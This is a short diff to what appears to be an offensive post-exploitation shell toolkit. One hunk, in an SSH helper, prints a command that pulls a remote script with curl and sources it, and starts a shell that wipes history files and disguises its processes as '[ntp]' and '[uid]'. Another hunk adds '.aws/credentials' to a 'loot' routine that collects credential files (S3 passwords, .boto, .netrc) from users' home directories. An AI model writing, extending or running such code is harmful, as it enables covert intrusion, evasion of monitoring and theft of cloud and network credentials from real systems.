@@ -148,11 +148,11 @@ xssh() {
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
     }
-    echo -e "May need to cut & paste:  ${CDC}source <(${_HSURL})${CN}"
+    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL ${_HSURL})${CN}"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
-        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize); exec -a [uid] bash -i' /dev/null"
+        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
     stty "${ttyp}"
 }
 
@@ -981,6 +981,7 @@ loot() {
     _loot_homes "AWS S3" ".s3backer_passwd"
     _loot_homes "AWS S3" ".passwd-s3fs"
     _loot_homes "AWS S3" ".boto"
+    _loot_homes "AWS S3" ".aws/credentials"
     _loot_homes "NETRC"  ".netrc"
 
     # SSRF
